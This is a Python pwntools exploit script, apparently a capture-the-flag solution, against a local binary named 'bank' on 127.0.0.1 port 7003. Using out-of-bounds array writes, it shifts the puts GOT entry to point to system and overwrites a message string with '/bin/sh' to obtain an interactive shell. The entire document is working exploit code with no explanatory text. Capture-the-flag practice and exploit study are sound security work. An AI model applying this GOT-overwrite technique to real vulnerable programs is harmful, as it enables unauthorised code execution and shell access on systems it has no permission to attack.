from pwn import *

FILE = "./bank"

#p = process(FILE)
p = remote("127.0.0.1", 7003)
e = ELF(FILE)
libc = ELF("./libc-2.28.so")

system_offset = libc.sym['system']
puts_offset = libc.sym['puts']

exit_msg_addr = e.sym['exit_msg']
accounts_addr = e.sym['accounts']

puts_diff = int((e.got['puts'] - accounts_addr) / 8)
system_diff = system_offset - puts_offset
exit_msg_diff = int((exit_msg_addr - accounts_addr) / 8)

start_msg = b"Have a n"
end_msg = b"/bin/sh\0"

msg_diff = int.from_bytes(end_msg, 'little') - int.from_bytes(start_msg, 'little')

p.recvline()
p.sendline(str(exit_msg_diff).encode())
p.recvline()
p.sendline(str(msg_diff).encode())
p.recvline()
p.sendline(str(puts_diff).encode())
p.recvline()
p.sendline(str(system_diff).encode())

p.interactive()
